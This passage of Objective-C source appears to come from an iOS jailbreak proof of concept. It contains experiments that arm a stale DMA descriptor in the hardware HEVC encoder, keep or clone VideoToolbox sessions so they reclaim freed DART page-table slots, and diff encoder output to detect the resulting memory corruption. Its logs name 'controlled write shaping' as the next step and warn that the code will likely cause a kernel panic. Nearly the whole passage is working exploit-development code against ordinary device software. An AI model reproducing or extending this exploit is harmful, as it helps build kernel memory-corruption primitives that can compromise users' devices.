                int bsRegionAnoms = 0;
                if (varMin && varMax && curBS.length > DP2_FW_BS_OFFSET) {
                    size_t len = MIN(curBS.length, baseMaxLen);
                    size_t bsEnd = MIN(len, (size_t)(DP2_FW_BS_OFFSET + DP2_FW_BS_COPY_LEN));
                    for (size_t j = DP2_FW_BS_OFFSET; j < bsEnd; j++) {
                        if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
                            bsRegionAnoms++;
                        }
                    }
                }

                // Size anomaly
                BOOL sizeAnom = NO;
                for (NSData *tbs in trainBS) {
                    if (tbs.length > 0 && curBS.length != tbs.length) {
                        sizeAnom = YES;
                        break;
                    }
                }

                if (fwMetaHit || anomalies > 0 || sizeAnom) {
                    hitCount++;
                    if (firstHitTime < 0) firstHitTime = elapsed;
                    PASS(@"*** HIT at T+%ds (%@): %d envelope, %d +0x1270-region, "
                         @"fw_frame=%u fw_size=%u%@%@ ***",
                         elapsed, now, anomalies, bsRegionAnoms,
                         fwFrame, fwSize,
                         sizeAnom ? @" SIZE_CHANGE" : @"",
                         fwMetaHit ? @" FW_META_HIT" : @"");

                    // Dump first 32 anomalies
                    if (varMin && varMax) {
                        NSMutableString *hex = [NSMutableString string];
                        int dumped = 0;
                        size_t len = MIN(curBS.length, baseMaxLen);
                        for (size_t j = (size_t)(firstAnom >= 0 ? firstAnom : 0);
                             j < len && dumped < 32; j++) {
                            if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
                                [hex appendFormat:@"%04zx:%02x(range %02x-%02x) ",
                                    j, cur[j], varMin[j], varMax[j]];
                                dumped++;
                            }
                        }
                        LOG(@"  Envelope anomalies: %@", hex);
                    }

                    // Dump firmware metadata region
                    if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
                        NSMutableString *fwHex = [NSMutableString string];
                        size_t fwStart = DP2_FW_FRAME_OFFSET;
                        size_t fwEnd = MIN(curBS.length, (size_t)(DP2_FW_SIZE_OFFSET + 8));
                        for (size_t j = fwStart; j < fwEnd; j++) {
                            [fwHex appendFormat:@"%02x", cur[j]];
                            if ((j - fwStart + 1) % 4 == 0) [fwHex appendString:@" "];
                        }
                        LOG(@"  FW metadata (+0xa8..+0xb4): %@", fwHex);
                    }

                    [hitReport appendFormat:
                        @"T+%ds: env=%d bs_region=%d fw_frame=%u fw_size=%u%s%s\n",
                        elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize,
                        sizeAnom ? " SIZE" : "", fwMetaHit ? " FW_META" : ""];

                    os_log(dLog, "JBPoC-DPREP2v4-HIT T+%ds env=%d bs=%d fwF=%u fwS=%u meta=%d",
                           elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize, (int)fwMetaHit);

                    // On first hit: dump entire retained archive
                    if (hitCount == 1) {
                        NSString *archDir = [NSHomeDirectory()
                            stringByAppendingPathComponent:@"Documents/dprep2_archive"];
                        [[NSFileManager defaultManager] createDirectoryAtPath:archDir
                            withIntermediateDirectories:YES attributes:nil error:nil];
                        for (int ai = 0; ai < g_dp2ArchiveIdx; ai++) {
                            NSData *aBS = dp2ExtractFullBlock(g_dp2Archive[ai]);
                            if (aBS) {
                                NSString *label = (ai < g_dp2ArchiveArmMark) ? @"pre" :
                                    (ai == g_dp2ArchiveArmMark) ? @"arm" : @"post";
                                NSString *fn = [NSString stringWithFormat:
                                    @"%@/%@_%03d.bin", archDir, label, ai];
                                [aBS writeToFile:fn atomically:YES];
                            }
                        }
                        NSString *hitFn = [NSString stringWithFormat:
                            @"%@/HIT_T%03d.bin", archDir, elapsed];
                        [curBS writeToFile:hitFn atomically:YES];
                        PASS(@"Archive dumped: %d samples to %@", g_dp2ArchiveIdx, archDir);
                        os_log(dLog, "JBPoC-DPREP2v4-ARCHIVE dumped=%d", g_dp2ArchiveIdx);
                    }
                } else if (elapsed % 30 == 0 || elapsed == DPREP2_TEST_START_S) {
                    INFO(@"T+%03ds (%@): OK (%zu B, fw_frame=%u fw_size=%u, 0 anomalies)",
                         elapsed, now, curBS.length, fwFrame, fwSize);
                }
            } else {
                // Gap phase: T+45 to T+60 — still collecting, waiting for envelope
                INFO(@"T+%03ds: gap (envelope built, waiting for test phase)", elapsed);
            }
        } else {
            INFO(@"T+%03ds (%@): no output (enc=%.1fs, obs_rejects=%d, errors=%d)",
                 elapsed, now, obsEncDur, g_dp2ObsRejectCount, g_dp2Errors);
        }

        // Check input surface
        if (inputSnap) {
            CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
            uint8_t *curY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
            uint8_t *curUV = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 1);
            int inDiffs = 0;
            for (size_t j = 0; j < ySize; j++) {
                if (curY[j] != inputSnap[j]) inDiffs++;
            }
            for (size_t j = 0; j < uvSize; j++) {
                if (curUV[j] != inputSnap[ySize + j]) inDiffs++;
            }
            if (inDiffs > 0) {
                hitCount++;
                if (firstHitTime < 0) firstHitTime = elapsed;
                PASS(@"*** INPUT HIT at T+%ds: %d bytes ***", elapsed, inDiffs);
                memcpy(inputSnap, curY, ySize);
                memcpy(inputSnap + ySize, curUV, uvSize);
            }
            CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
        }
    }

    // Step 5: Summary
    pocLog(@"");
    LOG(@"═══════════════════════════════════════════════");
    if (hitCount > 0) {
        PASS(@"*** MODEL (b) CONFIRMED — keep-alive output readout! ***");
        LOG(@"Stale DMA write detected while session PTEs are valid!");
        LOG(@"Total hits: %d, first at T+%ds post-arm", hitCount, firstHitTime);
        LOG(@"The write succeeds harmlessly into the still-mapped buffer.");
        LOG(@"Primitive = arm + keep-alive + read output. Mode A likely unnecessary.");
        os_log(dLog, "JBPoC-DPREP2v4-RESULT MODEL_B hits=%d firstAt=%d", hitCount, firstHitTime);
    } else {
        INFO(@"No anomalies in bitstream or input over 240s.");
        pocLog(@"");
        if (g_dp2ObsRejectCount > 0) {
            PASS(@"*** CROSS-SESSION FINDING: obs session got %d -17691 rejections ***",
                 g_dp2ObsRejectCount);
            LOG(@"The HEVC firmware globally rejects encodes after trigger.");
            LOG(@"Obs session (no Alpha, separate VT session) saw -17691 on every frame.");
            LOG(@"This is NOT a callback leak — dprep2ObsCallback is isolated.");
            LOG(@"Implication: videocodecd/AVE2 firmware enters error state that");
            LOG(@"persists across VT sessions until cleared (reboot?).");
        }
        INFO(@"Interpretation (see decision tree):");
        INFO(@"  Clean window + fire on default timing (~90-160s) →");
        INFO(@"    model (b) supported but write landed somewhere we're not reading.");
        INFO(@"  Clean window + extended-no-fire (past ~240s) →");
        INFO(@"    Contradicts Q2's decoupling, revisit the model.");
        INFO(@"  Training set: %zu samples, %zu max bytes", trainBS.count, baseMaxLen);
        INFO(@"  Obs reject count: %d", g_dp2ObsRejectCount);
        if (varMin) {
            int inv = 0;
            for (size_t j = 0; j < baseMaxLen; j++) {
                if (varMin[j] == varMax[j]) inv++;
            }
            INFO(@"  Invariant bytes: %d/%zu (%.1f%%) — these would catch corruption",
                 inv, baseMaxLen, 100.0 * inv / baseMaxLen);
        }
        os_log(dLog, "JBPoC-DPREP2v4-RESULT NO_HITS train=%zu obsRejects=%d",
               trainBS.count, g_dp2ObsRejectCount);
    }
    LOG(@"═══════════════════════════════════════════════");

    // Write results
    NSString *resultStr = [NSString stringWithFormat:
        @"D-PREP-2 v4.1 RESULT (split callbacks)\nDate: %@\nARM: %@\n"
        @"Training samples: %zu\nMax bitstream: %zu\n"
        @"Archive samples: %d (arm mark: %d)\n"
        @"Obs session -17691 rejections: %d\n"
        @"Q4 offsets: frame#+0xa8, coded_size+0xac, bitstream+0x1270\n"
        @"Hits: %d\nFirst hit: T+%ds\nReport:\n%@\n",
        [NSDate date], armTime, trainBS.count, baseMaxLen,
        g_dp2ArchiveIdx, g_dp2ArchiveArmMark,
        g_dp2ObsRejectCount, hitCount, firstHitTime, hitReport];
    NSString *resultPath = [NSHomeDirectory()
        stringByAppendingPathComponent:@"Documents/dprep2_result.txt"];
    [resultStr writeToFile:resultPath atomically:YES
                  encoding:NSUTF8StringEncoding error:nil];
    INFO(@"Results written to %@", resultPath);

    // NO INVALIDATION — let the fire come on its own timing.
    // The session stays alive, PTEs mapped. The stale descriptor fires
    // via the idle timer at ~90-160s post-arm. If model (b), it already
    // wrote (detected above). If model (a), the fire comes now and panics
    // because it hits the STILL-mapped PTE — which means a successful
    // DMA into the coded buffer, not an unmap fault. The panic .ips DVA
    // will show a valid PTE (in the session's mapped range), not a fault
    // from a freed PTE. This distinguishes "write succeeded but we missed
    // it" from "write only happens at unmap."
    //
    // The session + pixel buffer leak intentionally. The process keeps them
    // alive. The panic will come. Keep the .ips!
    LOG(@"");
    LOG(@"*** NOT invalidating trigger or obs session — PTEs stay mapped. ***");
    LOG(@"Trigger session: Alpha=255, armed DMA descriptor stale.");
    LOG(@"Observation session: clean, canary frames recorded.");
    LOG(@"The stale descriptor fires via idle timer (~90-160s post-arm).");
    LOG(@"If it panics with DVA in trigger's mapped range → write succeeded");
    LOG(@"silently (noise? wrong region?). If in obs range → cross-session DMA.");
    LOG(@"If no panic within ~200s → fire needs teardown trigger (F≈U).");
    LOG(@"Keep the .ips!");

    if (varMin) free(varMin);
    if (varMax) free(varMax);
    if (inputSnap) free(inputSnap);
    dp2FreeSamples();
    // Archive intentionally NOT freed — retained for post-panic recovery
    // dp2FreeArchive() would destroy the evidence
    // Intentionally NOT releasing trigger/obs sessions, pb — keep PTEs alive
    g_phase2Running = NO;

    PASS(@"D-PREP-2 readout complete. Archive: %d samples retained.", g_dp2ArchiveIdx);
    LOG(@"Session left alive — fire hits mapped PTEs (not an unmap fault).");
    LOG(@"Q4 signals: frame# at +0xa8, coded_size at +0xac, bitstream at +0x1270.");
}

// ============================================================
// EXPERIMENT 3.0: Mode A — Clone-Session Bitstream-Diff
//
// The gating question is resolved: AXI_ID 0xc0 writes to an
// INTERNAL driver-owned coded-output buffer. App-side IOSurfaces
// never enter the AVE DART aperture — only the kext maps surfaces
// into the encoder's DART pool via DARTMapInternalSurfaces during
// session CONFIGURE. A bare IOSurface spray stays in the generic
// allocator and can never re-claim the freed encoder PTE slots.
//
// The re-claim IS the clone: an identity-clone session drives
// the same internal surface allocation through the same bump
// allocator. Cross-boot PTE determinism (PTEs 0x1c4-0x20b across
// 8 panics) means identical parameters land the coded buffer on
// the recycled DVA — no spray, no size matching needed.
//
// Detection: we can't read the clone's internal coded buffer
// directly. Instead we diff the clone's CMSampleBuffer bitstream
// output against a clean-clone baseline. Anomalous bytes at fixed
// offsets = the stale DMA write corrupted the coded buffer before
// the ISR memcpy (dva+0x1270, length 0x9400) copied it out.
//
// PREREQUISITE: Run D-prep-2 and C2 first!
//   - D-prep-2 (keep-alive): tests if the write lands while PTEs
//     are still valid (model b). If yes, Mode A is unnecessary —
//     the primitive is "arm, keep alive, read output."
//   - C2 (kill→fire latency): measures the re-claim window.
//     If fire ≈ instantaneous with teardown (F≈U), no time to
//     clone before panic. Mode A needs the keep-alive variant.
//
// Phases:
// 1. BASELINE: Clean session, encode N frames, collect checksums
// 2. ARM: AlphaLayerID=255, encode → -17691, DMA armed
// 3. FREE: Tear down armed session → DART PTEs freed
// 4. CLONE: Fresh session with identical config (Alpha=0), encode
//    frames — its CONFIGURE re-claims the coded-output DVA slot
// 5. DIFF: Compare clone output bitstreams against baseline
// ============================================================

#define EXP3_BASELINE_FRAMES   5
#define EXP3_CLONE_FRAMES     30
#define EXP3_POLL_SECS       200

static volatile BOOL g_exp3Armed = NO;
static volatile int g_exp3EncodeStatus = 0;

static void exp3ArmCallback(
    void *ctx, void *sourceFrameRefCon, OSStatus status,
    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
    g_exp3EncodeStatus = (int)status;
    if (status != noErr && !sampleBuffer) {
        g_exp3Armed = YES;
        if (status == -17691) {
            PASS(@"[Exp3] -17691 — classic arm, firmware DMA is armed!");
        } else {
            PASS(@"[Exp3] %d — alternate arm signature, continuing", (int)status);
        }
        return;
    }
    if (status == noErr && sampleBuffer) {
        FAIL(@"[Exp3] Arm encode SUCCEEDED — Alpha=255 not taken");
    }
}

// Baseline/clone output collection
#define EXP3_MAX_SAMPLES 64
static CMSampleBufferRef g_exp3Samples[EXP3_MAX_SAMPLES];
static volatile int g_exp3SampleCount = 0;
static volatile int g_exp3SampleErrors = 0;

static void exp3CollectCallback(
    void *ctx, void *sourceFrameRefCon, OSStatus status,
    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
    if (status != noErr) {
        g_exp3SampleErrors++;
        INFO(@"[Exp3] Collect callback error: %d", (int)status);
        return;
    }
    if (sampleBuffer && g_exp3SampleCount < EXP3_MAX_SAMPLES) {
        CFRetain(sampleBuffer);
        g_exp3Samples[g_exp3SampleCount] = sampleBuffer;
        g_exp3SampleCount++;
    }
}

static NSData *exp3GetBitstreamData(CMSampleBufferRef sbuf) {
    if (!sbuf) return nil;
    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sbuf);
    if (!block) return nil;
    size_t len = CMBlockBufferGetDataLength(block);
    if (len == 0) return nil;
    NSMutableData *data = [NSMutableData dataWithLength:len];
    CMBlockBufferCopyDataBytes(block, 0, len, data.mutableBytes);
    return data;
}

static void exp3FreeSamples(void) {
    for (int i = 0; i < g_exp3SampleCount; i++) {
        if (g_exp3Samples[i]) {
            CFRelease(g_exp3Samples[i]);
            g_exp3Samples[i] = NULL;
        }
    }
    g_exp3SampleCount = 0;
    g_exp3SampleErrors = 0;
}

static VTCompressionSessionRef exp3CreateSession(
    void *callback, BOOL setAlpha255) {
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        (VTCompressionOutputCallback)callback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        return NULL;
    }

    if (setAlpha255) {
        VTSessionSetProperty(session,
            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
            (__bridge CFTypeRef)@(255));
    }

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        FAIL(@"PrepareToEncode failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }

    return session;
}

static CVPixelBufferRef exp3CreatePixelBuffer(uint8_t yFill, uint8_t uvFill) {
    CVPixelBufferRef pb = NULL;
    OSStatus status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);
    if (status != noErr || !pb) return NULL;

    CVPixelBufferLockBaseAddress(pb, 0);
    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, yFill,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
        CVPixelBufferGetHeightOfPlane(pb, 0));
    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, uvFill,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
        CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static void runExp3_ModeA(void) {
    pocLog(@"");
    pocLog(@"╔═══════════════════════════════════════════╗");
    pocLog(@"║  EXPERIMENT 3.0: Mode A Clone-Session     ║");
    pocLog(@"║  Bitstream-Diff DART Re-claim             ║");
    pocLog(@"║  *** WILL LIKELY CAUSE KERNEL PANIC ***   ║");
    pocLog(@"╚═══════════════════════════════════════════╝");
    pocLog(@"");

    INFO(@"PREREQUISITE: Run D-prep-2 and C2 first!");
    INFO(@"D-prep-2 tests if write lands while PTEs are valid (model b).");
    INFO(@"C2 measures the re-claim window (kill→fire latency).");
    INFO(@"If D-prep-2 hits, Mode A is unnecessary.");
    INFO(@"If C2 shows fire≈kill, Mode A can't sequence in time.");
    pocLog(@"");

    os_log_t eLog = os_log_create("com.research.jbpoc", "exp3");

    // ---- PHASE 1: BASELINE ----
    LOG(@"═══ PHASE 1: BASELINE (clean session output) ═══");
    LOG(@"Collecting %d clean encode outputs as reference...", EXP3_BASELINE_FRAMES);

    exp3FreeSamples();
    VTCompressionSessionRef baseSession = exp3CreateSession(
        (void *)exp3CollectCallback, NO);
    if (!baseSession) {
        FAIL(@"Could not create baseline session");
        return;
    }
    PASS(@"Baseline HEVC 320x240 session created");

    CVPixelBufferRef basePB = exp3CreatePixelBuffer(0x80, 0x80);
    if (!basePB) {
        FAIL(@"Baseline pixel buffer failed");
        VTCompressionSessionInvalidate(baseSession);
        CFRelease(baseSession);
        return;
    }

    for (int i = 0; i < EXP3_BASELINE_FRAMES; i++) {
        CMTime pts = CMTimeMake(i, 30);
        VTCompressionSessionEncodeFrame(baseSession, basePB, pts,
            kCMTimeInvalid, NULL, NULL, NULL);
    }
    VTCompressionSessionCompleteFrames(baseSession, kCMTimeInvalid);
    [NSThread sleepForTimeInterval:1.0];

    int baselineCount = g_exp3SampleCount;
    PASS(@"Baseline collected: %d samples, %d errors",
         baselineCount, g_exp3SampleErrors);

    // Store baseline bitstream checksums and data
    NSMutableArray *baselineData = [NSMutableArray array];
    NSMutableArray *baselineSizes = [NSMutableArray array];
    for (int i = 0; i < baselineCount; i++) {
        NSData *bs = exp3GetBitstreamData(g_exp3Samples[i]);
        if (bs) {
            [baselineData addObject:bs];
            [baselineSizes addObject:@(bs.length)];
            LOG(@"  Baseline[%d]: %zu bytes", i, bs.length);
        } else {
            [baselineData addObject:[NSData data]];
            [baselineSizes addObject:@(0)];
            INFO(@"  Baseline[%d]: no bitstream data", i);
        }
    }

    // Tear down baseline session
    VTCompressionSessionInvalidate(baseSession);
    CFRelease(baseSession);
    CVPixelBufferRelease(basePB);
    exp3FreeSamples();

    if (baselineData.count == 0) {
        FAIL(@"No baseline data collected — cannot diff");
        return;
    }

    os_log(eLog, "JBPoC-EXP3 PHASE1 baseline=%d frames", baselineCount);

    // Brief pause between sessions
    [NSThread sleepForTimeInterval:2.0];

    // ---- PHASE 2: ARM ----
    LOG(@"");
    LOG(@"═══ PHASE 2: ARM (AlphaLayerID=255) ═══");

    g_exp3Armed = NO;
    g_exp3EncodeStatus = 0;
    VTCompressionSessionRef armSession = exp3CreateSession(
        (void *)exp3ArmCallback, YES);
    if (!armSession) {
        FAIL(@"Could not create armed session");
        return;
    }
    PASS(@"Armed HEVC 320x240 session created (AlphaLayerID=255)");

    CVPixelBufferRef armPB = exp3CreatePixelBuffer(0x80, 0x80);
    if (!armPB) {
        FAIL(@"Armed pixel buffer failed");
        VTCompressionSessionInvalidate(armSession);
        CFRelease(armSession);
        return;
    }

    CMTime armPTS = CMTimeMake(0, 30);
    OSStatus encStatus = VTCompressionSessionEncodeFrame(armSession, armPB,
        armPTS, kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"Armed EncodeFrame submitted: %d", (int)encStatus);

    VTCompressionSessionCompleteFrames(armSession, kCMTimeInvalid);
    [NSThread sleepForTimeInterval:2.0];

    if (!g_exp3Armed) {
        FAIL(@"Arm not detected. EncodeFrame returned %d", g_exp3EncodeStatus);
        INFO(@"No error from firmware — Alpha=255 may not trigger on this build.");
        VTCompressionSessionInvalidate(armSession);
        CFRelease(armSession);
        CVPixelBufferRelease(armPB);
        return;
    }

    os_log(eLog, "JBPoC-EXP3 PHASE2 armed=YES");

    // ---- PHASE 3: FREE ----
    LOG(@"");
    LOG(@"═══ PHASE 3: FREE (Session teardown) ═══");
    LOG(@"Invalidating armed session — DART PTEs freed,");
    LOG(@"firmware DMA descriptor stays armed with stale DVA.");
    LOG(@"*** IF FIRE ≈ UNMAP, device panics here. ***");
    LOG(@"*** That's the F≈U sequencing risk — run C2 first! ***");

    NSDate *freeTime = [NSDate date];
    VTCompressionSessionInvalidate(armSession);
    CFRelease(armSession);
    armSession = NULL;
    CVPixelBufferRelease(armPB);
    armPB = NULL;

    [NSThread sleepForTimeInterval:0.5];
    PASS(@"Armed session torn down. Stale DVA is live.");
    LOG(@"Survived 0.5s post-teardown — F≈U not immediate.");
    os_log(eLog, "JBPoC-EXP3 PHASE3 freed survived_500ms");

    // ---- PHASE 4: CLONE ----
    LOG(@"");
    LOG(@"═══ PHASE 4: CLONE (Identity re-claim) ═══");
    LOG(@"Creating clone session with identical config (Alpha=0).");
    LOG(@"Its CONFIGURE drives DARTMapInternalSurfaces through the");
    LOG(@"same bump allocator → coded-output lands on recycled DVA.");

    exp3FreeSamples();
    VTCompressionSessionRef cloneSession = exp3CreateSession(
        (void *)exp3CollectCallback, NO);
    if (!cloneSession) {
        FAIL(@"Clone session creation failed");
        INFO(@"If device panics shortly, F≈U confirmed — stale descriptor");
        INFO(@"fired before clone could map. Need keep-alive variant.");
        INFO(@"Check .ips: DVA in freed PTE range → ARM→FREE→CLONE can't sequence.");
        return;
    }
    PASS(@"Clone session created — internal surfaces re-mapped");
    LOG(@"If the bump allocator recycled the armed DVA, the clone's");
    LOG(@"coded-output buffer now sits at the stale descriptor's target.");
    LOG(@"*** CONFIG IDENTITY NOTE: baseline Alpha=0, arm Alpha=255 ***");
    LOG(@"If Alpha=255 changes InfoSet composition (alpha layers add surfaces),");
    LOG(@"clone's coded buffer may land at a DIFFERENT DVA than the armed one.");
    LOG(@"Check panic .ips DVA against known PTE range 0x1c4-0x20b (8 panics).");
    LOG(@"In-band DVA → reclaim placement failed (clone landed on DIFFERENT slot).");
    LOG(@"Out-band DVA → fire hit before/during clone mapping.");
    LOG(@"Backup: raw-IOKit CONFIGURE (sel 4) for tighter window control.");

    CVPixelBufferRef clonePB = exp3CreatePixelBuffer(0x80, 0x80);
    if (!clonePB) {
        FAIL(@"Clone pixel buffer failed");
        VTCompressionSessionInvalidate(cloneSession);
        CFRelease(cloneSession);
        return;
    }

    os_log(eLog, "JBPoC-EXP3 PHASE4 clone_created");

    // Encode frames through clone and collect output
    LOG(@"Encoding %d frames through clone session...", EXP3_CLONE_FRAMES);

    for (int i = 0; i < EXP3_CLONE_FRAMES; i++) {
        CMTime pts = CMTimeMake(i, 30);
        VTCompressionSessionEncodeFrame(cloneSession, clonePB, pts,
            kCMTimeInvalid, NULL, NULL, NULL);

        // Flush periodically so we get outputs during the wait window
        if ((i + 1) % 5 == 0) {
            VTCompressionSessionCompleteFrames(cloneSession, kCMTimeInvalid);
            [NSThread sleepForTimeInterval:0.1];
        }
    }
    VTCompressionSessionCompleteFrames(cloneSession, kCMTimeInvalid);
    [NSThread sleepForTimeInterval:1.0];

    int cloneCount = g_exp3SampleCount;
    PASS(@"Clone collected: %d samples, %d errors",
         cloneCount, g_exp3SampleErrors);
    os_log(eLog, "JBPoC-EXP3 PHASE4 clone_samples=%d errors=%d",
           cloneCount, g_exp3SampleErrors);

    // ---- Now wait for the stale descriptor to fire ----
    LOG(@"");
    LOG(@"Waiting for stale DMA fire while clone session holds PTEs...");
    LOG(@"Continuing to encode through clone every 10s to produce");
    LOG(@"bitstreams that may carry corruption from the stale write.");

    int elapsed0 = (int)[[NSDate date] timeIntervalSinceDate:freeTime];
    int remainWait = EXP3_POLL_SECS - elapsed0;
    if (remainWait < 30) remainWait = 30;

    for (int sec = 0; sec < remainWait; sec += 10) {
        [NSThread sleepForTimeInterval:10.0];
        int elapsed = (int)[[NSDate date] timeIntervalSinceDate:freeTime];

        // Encode a batch through clone to sample the coded buffer state
        for (int f = 0; f < 3; f++) {
            CMTime pts = CMTimeMake(cloneCount + f, 30);
            VTCompressionSessionEncodeFrame(cloneSession, clonePB, pts,
                kCMTimeInvalid, NULL, NULL, NULL);
        }
        VTCompressionSessionCompleteFrames(cloneSession, kCMTimeInvalid);
        [NSThread sleepForTimeInterval:0.5];

        int newCount = g_exp3SampleCount;
        INFO(@"T+%03ds: %d total samples collected (clone alive)", elapsed, newCount);
    }

    int finalCount = g_exp3SampleCount;
    LOG(@"");
    LOG(@"Total samples: %d (baseline: %d)", finalCount, baselineCount);

    // ---- PHASE 5: DIFF ----
    LOG(@"");
    LOG(@"═══ PHASE 5: DIFF (Bitstream comparison) ═══");
    LOG(@"Comparing clone outputs against baseline...");
    LOG(@"Corruption signature: anomalous bytes, especially near");
    LOG(@"DVA+0x1270 region (ISR memcpy copies 0x9400 bytes from there).");

    int hitCount = 0;
    int firstHitFrame = -1;
    NSMutableString *hitReport = [NSMutableString string];

    for (int i = 0; i < finalCount; i++) {
        NSData *cloneBS = exp3GetBitstreamData(g_exp3Samples[i]);
        if (!cloneBS || cloneBS.length == 0) continue;

        // Compare against baseline frame (wrap around)
        int baseIdx = i % baselineData.count;
        NSData *baseBS = baselineData[baseIdx];

        if (baseBS.length == 0) continue;

        // Size difference is a signal
        if (cloneBS.length != baseBS.length) {
            hitCount++;
            if (firstHitFrame < 0) firstHitFrame = i;
            NSString *msg = [NSString stringWithFormat:
                @"Frame %d: SIZE DIFF baseline=%zu clone=%zu",
                i, baseBS.length, cloneBS.length];
            PASS(@"*** HIT: %@ ***", msg);
            [hitReport appendFormat:@"%@\n", msg];
            os_log(eLog, "JBPoC-EXP3 DIFF-HIT frame=%d sizeDiff base=%zu clone=%zu",
                   i, baseBS.length, cloneBS.length);
            continue;
        }

        // Byte-level diff
        const uint8_t *baseBytes = baseBS.bytes;
        const uint8_t *cloneBytes = cloneBS.bytes;
        size_t len = MIN(baseBS.length, cloneBS.length);

        int diffs = 0;
        int firstDiffOff = -1;

        for (size_t j = 0; j < len; j++) {
            if (baseBytes[j] != cloneBytes[j]) {
                if (diffs == 0) firstDiffOff = (int)j;
                diffs++;
            }
        }

        if (diffs > 0) {
            // Is this an expected difference (different encode, frame number, etc)?
            // Frames with same index against same baseline should be very close.
            // Large diff counts or diffs in unusual regions are the signal.
            if (i < baselineCount) {
                // Same frame index as baseline — should be near-identical
                // (same input, same config, same encoder state)
                hitCount++;
                if (firstHitFrame < 0) firstHitFrame = i;

                PASS(@"*** HIT: Frame %d: %d bytes differ (first at 0x%x) ***",
                     i, diffs, firstDiffOff);

                // Dump first 32 differences
                NSMutableString *hex = [NSMutableString string];
                int dumped = 0;
                for (size_t j = (size_t)firstDiffOff; j < len && dumped < 32; j++) {
                    if (baseBytes[j] != cloneBytes[j]) {
                        [hex appendFormat:@"%04zx:%02x→%02x ", j, baseBytes[j], cloneBytes[j]];
                        dumped++;
                    }
                }
                LOG(@"  Diff: %@", hex);
                [hitReport appendFormat:@"Frame %d: %d diffs at 0x%x\n", i, diffs, firstDiffOff];

                os_log(eLog, "JBPoC-EXP3 DIFF-HIT frame=%d diffs=%d first=0x%x",
                       i, diffs, firstDiffOff);
            } else {
                // Later frame — diff is expected (different frame number), just log
                INFO(@"Frame %d: %d byte diffs vs baseline[%d] (expected for later frames)",
                     i, diffs, baseIdx);
            }
        } else if (i < baselineCount) {
            INFO(@"Frame %d: identical to baseline (no corruption)", i);
        }
    }

    // Also check input surface of clone (secondary: stale descriptor
    // could stray onto external mappings — cheap and already proven)
    IOSurfaceRef cloneInputSurf = CVPixelBufferGetIOSurface(clonePB);
    int inputDiffs = 0;
    if (cloneInputSurf) {
        IOSurfaceLock(cloneInputSurf, kIOSurfaceLockReadOnly, NULL);
        uint8_t *inputBase = (uint8_t *)IOSurfaceGetBaseAddress(cloneInputSurf);
        size_t inputSize = IOSurfaceGetAllocSize(cloneInputSurf);
        if (inputBase) {
            for (size_t j = 0; j < inputSize; j++) {
                if (inputBase[j] != 0x80) {
                    inputDiffs++;
                }
            }
        }
        IOSurfaceUnlock(cloneInputSurf, kIOSurfaceLockReadOnly, NULL);
        if (inputDiffs > 0) {
            PASS(@"*** INPUT SURFACE HIT: %d bytes differ from 0x80 fill ***", inputDiffs);
            os_log(eLog, "JBPoC-EXP3 INPUT-HIT diffs=%d", inputDiffs);
        }
    }

    // ---- RESULTS ----
    pocLog(@"");
    LOG(@"═══════════════════════════════════════════════");
    if (hitCount > 0) {
        PASS(@"*** CLONE BITSTREAM CORRUPTION DETECTED ***");
        LOG(@"Stale DMA write corrupted clone's coded-output buffer,");
        LOG(@"and the corruption propagated into the bitstream output.");
        LOG(@"Total anomalous frames: %d, first at frame %d", hitCount, firstHitFrame);
        if (inputDiffs > 0) {
            LOG(@"BONUS: Input surface also hit (%d bytes) — better primitive!", inputDiffs);
        }
        pocLog(@"");
        LOG(@"This confirms:");
        LOG(@"1. Clone re-claimed the armed DVA slot");
        LOG(@"2. Firmware stale DMA landed in clone's coded buffer");
        LOG(@"3. The corruption is observable through normal VT output");
        LOG(@"Next: analyze corruption pattern for controlled write shaping");
        os_log(eLog, "JBPoC-EXP3 RESULT CORRUPTION_CONFIRMED hits=%d firstFrame=%d inputHit=%d",
               hitCount, firstHitFrame, inputDiffs);
    } else {
        INFO(@"No bitstream anomalies detected.");
        pocLog(@"");
        INFO(@"Interpretation — check panic .ips DVA:");
        INFO(@"1. DVA in clone's PTE range (0x1c4-0x20b) → reclaim WORKED,");
        INFO(@"   corruption in buffer but ISR memcpy path missed it.");
        INFO(@"   → Refine: target dva+0x1270 region, or use raw-IOKit path.");
        INFO(@"2. DVA outside clone's range → reclaim placement FAILED.");
        INFO(@"   Alpha=255→0 may have changed InfoSet → different DVA.");
        INFO(@"   → Fix: match Alpha in clone, or use raw-IOKit CONFIGURE.");
